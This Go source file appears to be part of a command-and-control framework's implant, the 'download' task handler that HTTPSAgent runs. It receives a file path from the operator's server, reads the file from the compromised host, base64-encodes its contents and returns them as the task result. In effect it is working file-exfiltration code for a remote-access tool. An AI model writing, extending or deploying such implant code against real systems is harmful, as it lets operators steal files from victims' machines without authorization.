package agent

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"

	"c2framework/internals/control"
	"c2framework/internals/models"
	"c2framework/internals/server"
)

// orchestrateDownload is the orchestrator for the "download" command
func (agent *HTTPSAgent) orchestrateDownload(job *server.HTTPSResponse) AgentTaskResult {

	// Unmarshal the arguments
	var downloadArgs control.DownloadArgs
	if err := json.Unmarshal(job.Arguments, &downloadArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal DownloadArgs for Task ID %s: %v", job.JobID, err)
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| %s", errMsg)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   "failed to unmarshal DownloadArgs",
		}
	}

	log.Printf("|DOWNLOAD ORCHESTRATOR| Task ID: %s. Downloading file: %s",
		job.JobID, downloadArgs.FilePath)

	// Agent-side validation
	if downloadArgs.FilePath == "" {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Task ID %s: FilePath is empty.", job.JobID)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   "FilePath cannot be empty",
		}
	}

	// Call the doer
	result := doDownload(downloadArgs.FilePath)

	// Build the final result
	finalResult := AgentTaskResult{
		JobID: job.JobID,
	}

	outputJSON, _ := json.Marshal(result)
	finalResult.CommandResult = outputJSON

	if !result.Success {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Download failed for TaskID %s: %s",
			job.JobID, result.ErrorMsg)
		finalResult.Error = result.ErrorMsg
		finalResult.Success = false
	} else {
		log.Printf("|DOWNLOAD SUCCESS| Downloaded %d bytes from %s for TaskID %s",
			result.FileSize, downloadArgs.FilePath, job.JobID)
		finalResult.Success = true
	}

	return finalResult
}

// doDownload performs the actual file reading
func doDownload(filePath string) models.DownloadResult {
	result := models.DownloadResult{
		FilePath: filePath,
	}

	// Check if file exists
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("file not found: %v", err)
		return result
	}

	// Check if it's a regular file (not directory)
	if fileInfo.IsDir() {
		result.Success = false
		result.ErrorMsg = "path is a directory, not a file"
		return result
	}

	result.FileSize = fileInfo.Size()

	// Read the file
	file, err := os.Open(filePath)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to open file: %v", err)
		return result
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to read file: %v", err)
		return result
	}

	// Encode to base64 for safe JSON transmission
	result.FileData = base64.StdEncoding.EncodeToString(fileBytes)
	result.Success = true

	log.Printf("|DOWNLOAD DOER| Read %d bytes from %s", len(fileBytes), filePath)
	return result
}
